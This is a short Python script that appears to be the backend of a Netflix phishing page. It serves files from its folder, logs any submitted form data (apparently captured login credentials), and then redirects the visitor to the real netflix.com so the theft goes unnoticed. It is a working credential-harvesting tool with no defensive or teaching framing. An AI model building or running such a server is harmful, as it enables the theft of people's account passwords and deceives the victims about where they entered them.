#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import logging
import cgi

class Netflix(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, directory=".", **kwargs)  # Use current directory to serve files

    def do_POST(self):
        # Log the POST data
        content_type, pdict = cgi.parse_header(self.headers['Content-Type'])
        if content_type == 'application/x-www-form-urlencoded':
            length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(length).decode('utf-8')
            logging.info(f"POST Data: {post_data}")

        # Send a 301 redirect to the user
        self.send_response(301)
        self.send_header('Location', 'https://www.netflix.com/browse')
        self.end_headers()

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    server_address = ('0.0.0.0', 3000)  # Change first parameter to '0.0.0.0' to expose for outside network
    httpd = HTTPServer(server_address, Netflix)
    logging.info('Starting...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping...\n')
